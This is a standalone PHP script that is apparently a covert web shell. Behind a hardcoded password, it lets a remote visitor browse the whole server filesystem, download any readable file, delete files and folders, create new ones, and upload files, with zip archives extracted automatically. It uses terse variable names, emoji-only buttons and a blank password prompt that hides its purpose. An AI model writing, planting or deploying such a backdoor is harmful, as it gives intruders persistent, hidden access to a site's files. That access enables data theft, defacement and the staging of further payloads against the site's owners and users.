<?php
$p = '#finder#$12^#'; 

if (isset($_GET['p']) && $_GET['p'] === $p) {
    $d = isset($_GET['d']) ? $_GET['d'] : getcwd();
    $d = realpath($d);

    if (!$d) {
        die();
    }

    if (isset($_POST['a'])) {
        $t = $d . DIRECTORY_SEPARATOR . $_POST['n'];
        
        switch ($_POST['a']) {
            case 'cf':
                file_put_contents($t, '');
                break;
            case 'cd':
                mkdir($t);
                break;
            case 'd':
                is_dir($t) ? rmdir($t) : unlink($t);
                break;
        }
        header("Location: ?d=" . urlencode($d) . "&p=" . urlencode($_GET['p']));
        exit;
    }

    if (isset($_FILES['f'])) {
        $u = $d . DIRECTORY_SEPARATOR . basename($_FILES['f']['name']);
        move_uploaded_file($_FILES['f']['tmp_name'], $u);
        
        $e = strtolower(pathinfo($u, PATHINFO_EXTENSION));
        if ($e === 'zip') {
            $z = new ZipArchive;
            if ($z->open($u)) {
                $z->extractTo($d);
                $z->close();
            }
        }
        
        header("Location: ?d=" . urlencode($d) . "&p=" . urlencode($_GET['p']));
        exit;
    }

    if (isset($_GET['dl'])) {
        $f = realpath($_GET['dl']);
        if (file_exists($f) && is_file($f)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($f) . '"');
            header('Content-Length: ' . filesize($f));
            readfile($f);
            exit;
        } else {
            die();
        }
    }

    $fs = scandir($d);
?>
<!DOCTYPE html>
<html>
<head>
    <script>
        function c(f) {
            if (confirm("?")) {
                f.submit();
            }
        }
    </script>
</head>
<body>
    <p><?php echo htmlspecialchars($d); ?></p>
    <ul>
        <?php if ($d !== '/'): ?>
            <li><a href="?d=<?php echo urlencode(dirname($d)); ?>&p=<?php echo urlencode($_GET['p']); ?>">⬆</a></li>
        <?php endif; ?>
        <?php foreach ($fs as $f): ?>
            <?php if ($f !== '.' && $f !== '..'): ?>
                <li>
                    <?php $pt = $d . DIRECTORY_SEPARATOR . $f; ?>
                    <?php if (is_dir($pt)): ?>
                        <a href="?d=<?php echo urlencode($pt); ?>&p=<?php echo urlencode($_GET['p']); ?>">📁 <?php echo htmlspecialchars($f); ?></a>
                    <?php else: ?>
                        📄 <?php echo htmlspecialchars($f); ?>
                        <a href="?dl=<?php echo urlencode($pt); ?>&p=<?php echo urlencode($_GET['p']); ?>">⬇</a>
                    <?php endif; ?>
                    <form method="post" style="display:inline;" onsubmit="event.preventDefault(); c(this);">
                        <input type="hidden" name="n" value="<?php echo htmlspecialchars($f); ?>">
                        <input type="hidden" name="a" value="d">
                        <button type="submit">❌</button>
                    </form>
                </li>
            <?php endif; ?>
        <?php endforeach; ?>
    </ul>
    <form method="post">
        <input type="text" name="n">
        <button type="submit" name="a" value="cf">📄</button>
        <button type="submit" name="a" value="cd">📁</button>
    </form>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="f">
        <button type="submit">⬆</button>
    </form>
</body>
</html>
<?php
} else {
?>
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <form method="get">
        <input type="text" name="p">
        <button type="submit"></button>
    </form>
</body>
</html>
<?php
}
?>
